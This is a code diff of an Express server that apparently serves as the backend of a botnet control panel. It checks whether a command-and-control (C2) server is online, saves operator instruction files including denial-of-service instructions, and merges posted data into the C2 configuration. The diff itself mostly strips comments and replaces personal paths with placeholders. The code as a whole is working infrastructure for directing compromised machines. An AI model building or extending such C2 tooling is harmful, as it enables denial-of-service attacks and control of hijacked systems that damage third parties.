@@ -11,10 +11,9 @@ const PORT = 3000;
 app.use(express.json());
 app.use(express.static('.'));
 
-// Load MariaDB config from db_controller.conf
 function loadMariaConfig() {
   const config = {};
-  const lines = fs.readFileSync('/home/xpr/repos/wyvern/configs/db_controller.conf', 'utf8').split('\n');
+  const lines = fs.readFileSync('/path/to/paralyze/configs/db_controller.conf', 'utf8').split('\n');
   for (const line of lines) {
     const [key, value] = line.trim().split('=');
     if (key && value) config[key] = value;
@@ -22,18 +21,15 @@ function loadMariaConfig() {
   return config;
 }
 
-// Load MongoDB config from mongo_controller.conf
 function loadMongoConfig() {
-  const content = fs.readFileSync('/home/xpr/repos/wyvern/configs/config_module.json', 'utf8');
+  const content = fs.readFileSync('/path/to/paralyze/configs/config_module.json', 'utf8');
   return JSON.parse(content);
 }
 
-// API route to check both DB statuses
 app.get('/api/status/db', async (req, res) => {
   let mariadbOK = false;
   let mongodbOK = false;
 
-  // Check MariaDB
   try {
     const cfg = loadMariaConfig();
     const conn = await mariadb.createConnection({
@@ -50,7 +46,6 @@ app.get('/api/status/db', async (req, res) => {
     console.error('MariaDB error:', err.message);
   }
 
-  // Check MongoDB
   try {
     const mcfg = loadMongoConfig();
     const mongo = new MongoClient(mcfg.general.uri);
@@ -68,14 +63,14 @@ app.get('/api/status/db', async (req, res) => {
 app.get('/api/status/c2', async (req, res) => {
   let isC2Online = false;
   try {
-    const c2Config = JSON.parse(fs.readFileSync('/home/xpr/repos/wyvern/configs/control_server.json', 'utf8'));
+    const c2Config = JSON.parse(fs.readFileSync('/path/to/paralyze/configs/control_server.json', 'utf8'));
     const address = c2Config.general.server.address;
     const port = c2Config.general.server.port;
 
     const net = require('net');
     const socket = new net.Socket();
 
-    const timeout = 2000; // ms
+    const timeout = 2000; 
     await new Promise((resolve, reject) => {
       socket.setTimeout(timeout);
       socket.once('error', reject);
@@ -92,18 +87,15 @@ app.get('/api/status/c2', async (req, res) => {
   res.json({ c2: isC2Online });
 });
 
-// server.js (add or replace your existing /api/save-instruction-json route)
 
 app.post('/api/save-instruction-json', express.json(), (req, res) => {
   const { filename, content } = req.body;
 
-  // 1) Strict filename check: no slashes, only alphanumeric, hyphens, underscores, and .json
   const FN_RE = /^[A-Za-z0-9_-]+\.json$/;
   if (!filename || !FN_RE.test(filename)) {
     return res.status(400).json({ success: false, error: 'Invalid filename' });
   }
 
-  // 2) Load interface_settings.conf
   let instrPath;
   try {
     const raw = fs.readFileSync(path.join(__dirname, 'interface_settings.conf'), 'utf8');
@@ -122,7 +114,6 @@ app.post('/api/save-instruction-json', express.json(), (req, res) => {
     return res.status(500).json({ success: false, error: 'instructions_path not set' });
   }
 
-  // 3) Build absolute directory, ensure it exists
   const baseDir = path.isAbsolute(instrPath)
     ? instrPath
     : path.join(__dirname, instrPath);
@@ -133,13 +124,11 @@ app.post('/api/save-instruction-json', express.json(), (req, res) => {
     return res.status(500).json({ success: false, error: 'Cannot access instructions directory' });
   }
 
-  // 4) Compose the full path, normalize, then verify no traversal
   const fullPath = path.normalize(path.join(baseDir, filename));
   if (!fullPath.startsWith(path.normalize(baseDir + path.sep))) {
     return res.status(400).json({ success: false, error: 'Path traversal detected' });
   }
 
-  // 5) Write the file
   try {
     fs.writeFileSync(fullPath, content, 'utf8');
     return res.json({ success: true, path: fullPath });
@@ -153,7 +142,6 @@ app.post('/api/instructions', express.json(), (req, res) => {
   const instructions = req.body.instructions ?? req.body;  
   console.log('Received instructions:', instructions);
 
-  // 1) Load instructions_path from interface_settings.conf
   let instrPath;
   try {
     const raw = fs.readFileSync(
@@ -172,7 +160,6 @@ app.post('/api/instructions', express.json(), (req, res) => {
     return res.status(500).json({ success: false, error: err.message });
   }
 
-  // 2) Resolve base directory and ensure it exists
   const baseDir = path.isAbsolute(instrPath)
     ? instrPath
     : path.join(__dirname, instrPath);
@@ -185,7 +172,6 @@ app.post('/api/instructions', express.json(), (req, res) => {
       .json({ success: false, error: 'Cannot access instructions directory' });
   }
 
-  // 3) Map instruction keys → filenames
   const fileMap = {
     dos:         'dos_instructions.json',
     init:        'init_instructions.json',
@@ -193,11 +179,10 @@ app.post('/api/instructions', express.json(), (req, res) => {
     maintenance: 'maintenance_instructions.json'
   };
 
-  // 4) Write each block to its own file
   try {
     for (const [key, data] of Object.entries(instructions)) {
       const filename = fileMap[key];
-      if (!filename) continue;  // skip unknown keys
+      if (!filename) continue;  
       const fullPath = path.join(baseDir, filename);
       fs.writeFileSync(fullPath, JSON.stringify(data, null, 2), 'utf8');
       console.log(`Saved ${key} instructions to ${fullPath}`);
@@ -269,7 +254,6 @@ function mergeDeep(target, source) {
 }
 
 app.post('/api/c2-config', (req, res) => {
-  // 1) Read interface_settings.conf
   let settings;
   try {
     const raw = fs.readFileSync(
@@ -297,7 +281,6 @@ app.post('/api/c2-config', (req, res) => {
       .json({ success: false, error: 'c2_path not set' });
   }
 
-  // 2) Validate filename (no traversal, must end in .json)
   const FN_RE = /^[A-Za-z0-9_\-\/]+\.json$/;
   if (!FN_RE.test(c2Path)) {
     return res
@@ -305,7 +288,6 @@ app.post('/api/c2-config', (req, res) => {
       .json({ success: false, error: 'Invalid c2_path' });
   }
 
-  // 3) Resolve full path and ensure directory exists
   const fullPath = path.isAbsolute(c2Path)
     ? c2Path
     : path.join(__dirname, c2Path);
@@ -320,7 +302,6 @@ app.post('/api/c2-config', (req, res) => {
       .json({ success: false, error: 'Cannot write to path' });
   }
 
-  // 4) Load existing or start fresh
   let current = {};
   if (fs.existsSync(fullPath)) {
     try {
@@ -328,16 +309,13 @@ app.post('/api/c2-config', (req, res) => {
       current = JSON.parse(txt);
     } catch (err) {
       console.error('Could not parse existing C2 config:', err);
-      // if malformed, we’ll overwrite entirely
       current = {};
     }
   }
 
-  // 5) Merge incoming fields
   const updated = mergeDeep(current, req.body);
   console.log('Merged C2 config:', updated);
 
-  // 6) Write it back
   try {
     fs.writeFileSync(
       fullPath,
@@ -353,7 +331,6 @@ app.post('/api/c2-config', (req, res) => {
   }
 });
 
-// Example API (optional)
 app.post('/api/shutdown', async (req, res) => {
   console.log("Shutdown requested");
   res.sendStatus(200);
